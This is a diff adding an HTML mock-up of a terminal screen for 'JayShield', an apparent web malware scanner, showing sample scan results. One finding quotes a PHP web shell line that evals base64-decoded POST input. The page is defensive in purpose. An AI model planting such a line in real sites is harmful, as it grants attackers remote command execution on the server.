@@ -1,0 +1,76 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>JayShield scan</title>
+<style>
+  :root {
+    --bg1:#0e1712; --bg2:#0a100c;
+    --edge:rgba(70,240,138,0.28); --hair:rgba(70,240,138,0.12);
+    --g:#46f08a; --bright:#8effb6; --ink:#e7eee8; --soft:#9db0a2;
+    --dim:#66786c; --dimmer:#5f7167; --red:#ff5c5c; --amber:#ff9d3c;
+    --mono:'SF Mono',ui-monospace,'JetBrains Mono',Menlo,monospace;
+  }
+  * { box-sizing:border-box; }
+  html,body { margin:0; background:transparent; }
+  body { padding:44px 40px; width:1080px; }
+
+  .term {
+    width:1000px;
+    border:1.4px solid var(--edge);
+    border-radius:18px;
+    background:linear-gradient(180deg,var(--bg1),var(--bg2));
+    box-shadow:0 20px 52px rgba(0,0,0,0.45);
+    overflow:hidden;
+  }
+  .bar {
+    height:50px; display:flex; align-items:center; gap:9px;
+    padding:0 22px; border-bottom:1px solid var(--hair);
+  }
+  .dot { width:13px; height:13px; border-radius:50%; }
+  .r{background:#ff5f56;} .y{background:#ffbd2e;} .gr{background:#27c93f;}
+  .title { margin-left:14px; color:var(--dimmer); font:16px/1 var(--mono); }
+
+  .body { padding:30px 40px 38px; }
+  pre { margin:0; font-family:var(--mono); }
+  .banner { font-size:18px; line-height:1.0; color:var(--bright); }
+  .out { font-size:18px; line-height:1.62; margin-top:26px; }
+
+  .g{color:var(--g);} .bright{color:var(--bright);} .ink{color:var(--ink);}
+  .soft{color:var(--soft);} .dim{color:var(--dim);} .dimmer{color:var(--dimmer);}
+  .red{color:var(--red);} .amber{color:var(--amber);} .b{font-weight:700;}
+</style>
+</head>
+<body>
+  <div class="term">
+    <div class="bar">
+      <span class="dot r"></span><span class="dot y"></span><span class="dot gr"></span>
+      <span class="title">jayshield — ~/public_html</span>
+    </div>
+    <div class="body">
+<pre class="banner">     ██╗ █████╗ ██╗   ██╗██╗  ██╗ █████╗  ██████╗██╗  ██╗██████╗ ██████╗  ██████╗
+     ██║██╔══██╗╚██╗ ██╔╝██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██╔═══██╗
+     ██║███████║ ╚████╔╝ ███████║███████║██║     █████╔╝ ██████╔╝██████╔╝██║   ██║
+██   ██║██╔══██║  ╚██╔╝  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔═══╝ ██╔══██╗██║   ██║
+╚█████╔╝██║  ██║   ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗██║     ██║  ██║╚██████╔╝
+ ╚════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝</pre>
+<pre class="out"><span class="g b">JayShield®  ·  find and remove web malware</span><span class="dim">   v1.2.1</span>
+<span class="dim">github.com/JayHackPro/JayShield</span>
+
+<span class="dim">Scanned 1,284 files (24.6 MB) in 0.9s</span>
+
+<span class="red b">CRITICAL</span><span class="ink b"> public_html/wp-content/uploads/logo.php</span>
+<span class="red">   ✕</span><span class="soft"> Obfuscated eval of a decoded payload</span><span class="dim">:1</span>
+<span class="dimmer">     &lt;?php @eval(base64_decode($_POST["cmd"]));</span>
+
+<span class="amber b">HIGH    </span><span class="ink b"> public_html/index.html</span>
+<span class="amber">   ▲</span><span class="soft"> Hidden or zero-size iframe</span><span class="dim">:42</span>
+
+<span class="bright b">Summary</span>
+<span class="red">critical 1</span><span class="dim">   </span><span class="amber">high 1</span><span class="dim">   medium 0   low 0</span>
+<span class="dim">2 files infected, 1,282 clean</span>
+<span class="g b">✔ Review the findings, then remove them safely with </span><span class="bright b">--quarantine</span></pre>
+    </div>
+  </div>
+</body>
+</html>
